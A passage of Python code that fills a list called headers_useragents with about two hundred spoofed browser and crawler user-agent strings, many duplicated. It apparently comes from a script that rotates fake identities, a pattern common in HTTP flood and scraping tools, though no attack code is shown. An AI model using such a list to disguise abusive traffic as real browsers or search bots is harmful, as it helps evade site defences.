        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html)"
        " Gecko/2008032620"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot"
        " www.idealobserver.com"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; Arachmo)")
    headers_useragents.append("Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible;"
        " +http://www.become.com/site_owners.html)"
    )
    headers_useragents.append("BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    )
    headers_useragents.append(
        "Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML,"
        " like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser"
        " 1.98.744; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo"
        " Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;"
        " Avant Browser)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser;"
        " GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1;"
        " .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like"
        " Gecko, Safari/419.3) Cheshire/1.0.ALPHA"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like"
        " Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML,"
        " like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
    )
    headers_useragents.append(
        "Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML,"
        " like Gecko) Version/7.0.3 Safari/7046A194A"
    )
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 3.55)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 2.00)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 1.00)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)"
    )
    headers_useragents.append("SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)")
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (FM Scene 4.6.1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) "
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004"
        " Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none;"
        " freenet DSL 1.1; (none))"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie;"
        " .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like"
        " Gecko) Safari/417.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010"
        " Firefox/1.0.7 (Ubuntu package 1.0.7)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR"
        " 2.0.50727; .NET CLR 3.0.04506.30)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)")
    headers_useragents.append("Opera/9.20 (Windows NT 6.0; U; en)")
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205"
        " Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR"
        " 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML,"
        " like Gecko) Version/4.0 Safari/528.16"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209"
        " Firefox/3.6.13"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)")
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401"
        " Firefox/4.0 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo"
        " Firefox/3.6.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809"
        " Fedora/3.6.7-1.fc14 Firefox/3.6.7"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc"
        " dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
